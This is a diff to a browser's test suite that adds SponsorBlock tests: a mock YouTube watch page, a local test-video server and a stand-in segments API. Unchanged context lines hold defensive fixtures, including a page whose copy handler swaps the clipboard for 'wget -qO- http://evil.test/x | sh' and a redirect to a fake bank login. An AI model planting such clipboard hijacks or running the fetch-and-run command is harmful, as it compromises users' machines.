@@ -95,6 +95,9 @@ PAGES = {
     "/install-guide": ("<html><title>install-guide</title><body><pre id='cmd'>curl -fsSL https://get.example.test | sh</pre>"
                        "<script>document.addEventListener('copy', e => { if (window.jack) { e.clipboardData.setData("
                        "'text/plain', 'wget -qO- http://evil.test/x | sh'); e.preventDefault(); } })</script></body></html>"),
+    # a YouTube-like watch page (the test maps it to https://www.youtube.com/watch?v=...)
+    "/watch": ("<html><title>watch</title><body><div class='html5-video-player'><video id='v' src='/sb.webm' muted "
+               "autoplay width=160 height=90></video></div></body></html>"),
     "/dlframes": "<html><title>dlframes</title><body>" + "".join(
         f"<iframe style='display:none' src='/dl?n={i}'></iframe>" for i in range(5)) + "</body></html>",
 }
@@ -103,6 +106,7 @@ PAGES = {
 BIG_FILE = bytes(range(256)) * 4096  # 1 MiB with a pattern, so a misplaced byte shows
 
 class Handler(http.server.BaseHTTPRequestHandler):
+    video = b""  # made by make_test_video() when a test needs it
     hits = {}
     requests = []  # full paths, query included
     download_requests = []  # (path, Range header, Cookie header) for /big.dat and /norange.dat
@@ -169,6 +173,38 @@ class Handler(http.server.BaseHTTPRequestHandler):
             self.wfile.flush()
             self.close_connection = True
             return
+        if path == "/sb.webm":  # the test video, with byte ranges so the player can jump
+            body, start = Handler.video, 0
+            wanted = self.headers.get("Range")
+            if wanted and wanted.startswith("bytes="):
+                start = int(wanted[6:].split("-")[0])
+                self.send_response(206)
+                self.send_header("Content-Range", f"bytes {start}-{len(body) - 1}/{len(body)}")
+            else:
+                self.send_response(200)
+            self.send_header("Content-Type", "video/webm")
+            self.send_header("Accept-Ranges", "bytes")
+            self.send_header("Content-Length", str(len(body) - start))
+            self.end_headers()
+            try:
+                self.wfile.write(body[start:])
+            except (BrokenPipeError, ConnectionResetError):
+                pass
+            return
+        if path.startswith("/sb-api/"):  # stands in for sponsor.ajay.app/api/skipSegments/
+            if path == "/sb-api/" + bb.sponsorblock_prefix("dQw4w9WgXcQ"):
+                body = json.dumps([{"videoID": "dQw4w9WgXcQ", "segments": [
+                    {"category": "sponsor", "actionType": "skip", "segment": [2, 14]}]},
+                    {"videoID": "zzzzzzzzzzz", "segments": []}]).encode()
+                self.send_response(200)
+            else:
+                body = b"Not Found"
+                self.send_response(404)
+            self.send_header("Content-Type", "application/json")
+            self.send_header("Content-Length", str(len(body)))
+            self.end_headers()
+            self.wfile.write(body)
+            return
         if path == "/to-fake-bank":  # a short link that leads to a copy of a bank's address
             self.send_response(302)
             self.send_header("Location", "http://sbi-kyc-update.invalid/login")
@@ -210,6 +246,29 @@ class TLSServer(http.server.ThreadingHTTPServer):
         except (ssl.SSLError, OSError):
             return  # the browser rejected the certificate
         super().finish_request(request, client_address)
+
+
+def make_test_video(seconds=30):
+    """A small silent WebM (160x90, VP8) made with GStreamer, or None when it can't be made here."""
+    try:
+        import gi
+        gi.require_version("Gst", "1.0")
+        from gi.repository import Gst
+        Gst.init(None)
+    except (ImportError, ValueError):
+        return None
+    path = os.path.join(_HOME, "test-video.webm")
+    try:
+        pipeline = Gst.parse_launch(
+            f"videotestsrc num-buffers={seconds * 10} pattern=ball ! video/x-raw,width=160,height=90,framerate=10/1 ! "
+            f"vp8enc deadline=1 cpu-used=8 keyframe-max-dist=10 ! webmmux ! filesink location={path}")
+    except GLib.Error:
+        return None
+    pipeline.set_state(Gst.State.PLAYING)
+    pipeline.get_bus().timed_pop_filtered(60 * Gst.SECOND, Gst.MessageType.EOS | Gst.MessageType.ERROR)
+    pipeline.set_state(Gst.State.NULL)
+    with open(path, "rb") as f:
+        return f.read() or None
 
 
 def spin(condition, timeout=10.0):
@@ -1916,6 +1975,74 @@ class WindowFeatureTests(unittest.TestCase):
         self.assertTrue(spin(lambda: clipboard.wait_for_text() == "wget -qO- http://evil.test/x | sh", 3))
         spin(lambda: seen, 1.5)
         self.assertEqual(seen, [], "a site the user trusts isn't warned about")
+
+    # ---- SponsorBlock ------------------------------------------------------
+    def sponsorblock_setup(self):
+        """Makes the local /watch page count as YouTube and SponsorBlock ask the local stand-in."""
+        win = self.win
+        if not Handler.video:
+            Handler.video = make_test_video()
+        if not Handler.video:
+            self.skipTest("GStreamer can't make a test video here")
+        local, youtube = f"http://127.0.0.1:{self.port}/", "https://www.youtube.com/"
+        real_id, real_api, real_hosts = bb.youtube_video_id, bb.SPONSORBLOCK_API, bb.SPONSORBLOCK_HOSTS
+        bb.youtube_video_id = lambda uri: real_id((uri or "").replace(local, youtube))
+        bb.SPONSORBLOCK_API = self.base + "/sb-api/"
+        bb.SPONSORBLOCK_HOSTS = real_hosts + ("127.0.0.1",)
+        real_script = win.sponsorblock_script
+        win.sponsorblock_script = WebKit2.UserScript.new_for_world(  # without the YouTube-only address list
+            bb.SPONSORBLOCK_JS, WebKit2.UserContentInjectedFrames.TOP_FRAME,
+            WebKit2.UserScriptInjectionTime.START, bb.SPONSORBLOCK_WORLD, None, None)
+
+        def restore():
+            win.on_sponsorblock_toggled(False)
+            win.sponsorblock_script = real_script
+            bb.youtube_video_id, bb.SPONSORBLOCK_API, bb.SPONSORBLOCK_HOSTS = real_id, real_api, real_hosts
+            win._sponsor_segments.clear()
+        self.addCleanup(restore)
+
+    def load_watch_page(self):
+        wv = self.win.get_active_webview()
+        wv.load_uri(self.base + "/watch?v=dQw4w9WgXcQ")
+        self.assertTrue(spin(lambda: wv.get_title() == "watch" and not wv.is_loading(), 10), "watch page didn't load")
+        return wv
+
+    def status_text(self):
+        def labels(widget):
+            if isinstance(widget, Gtk.Label):
+                return [widget.get_text()]
+            return sum((labels(c) for c in widget.get_children()), []) if isinstance(widget, Gtk.Container) else []
+        return " ".join(labels(self.win.statusbar))
+
+    def test_sponsorblock_skips_a_sponsor_and_sends_only_a_hash_prefix(self):
+        win = self.win
+        self.sponsorblock_setup()
+        win.on_sponsorblock_toggled(True)
+        self.assertTrue(win.sponsorblock_enabled)
+        wv = self.load_watch_page()
+        started = time.time()
+        self.assertTrue(spin(lambda: float(js(wv, "document.getElementById('v').currentTime") or 0) >= 14, 12),
+                        "the video never got past the sponsor")
+        self.assertLess(time.time() - started, 10, "it played through the 12-second sponsor instead of skipping it")
+        self.assertIn("Skipped a sponsor (0:02–0:14)", self.status_text())
+        asked = [r for r in Handler.requests if r.startswith("/sb-api/")]
+        self.assertEqual(len(asked), 1, asked)
+        self.assertTrue(asked[0].startswith("/sb-api/5f6b?categories="), asked[0])
+        self.assertNotIn("dQw4w9WgXcQ", asked[0])
+        self.assertEqual(win._sponsor_segments["dQw4w9WgXcQ"], [[2.0, 14.0, "sponsor"]])
+        self.assertEqual(win._sponsor_segments["zzzzzzzzzzz"], [], "the rest of the answer is kept for later")
+
+    def test_sponsorblock_off_asks_nothing_and_turning_it_on_works_at_once(self):
+        win = self.win
+        self.sponsorblock_setup()
+        win.on_sponsorblock_toggled(False)
+        wv = self.load_watch_page()
+        self.assertTrue(spin(lambda: float(js(wv, "document.getElementById('v').currentTime") or 0) >= 3, 8))
+        self.assertEqual([r for r in Handler.requests if r.startswith("/sb-api/")], [])
+        self.assertEqual(js(wv, "String(document.getElementById('v').currentTime < 10)"), "true", "nothing skipped")
+        win.on_sponsorblock_toggled(True)  # switched on while the video plays: it skips without a reload
+        self.assertTrue(spin(lambda: float(js(wv, "document.getElementById('v').currentTime") or 0) >= 14, 4),
+                        "turning it on didn't reach the page that was already open")
 
     # ---- passwords ------------------------------------------------------
     def test_password_save_then_fill(self):
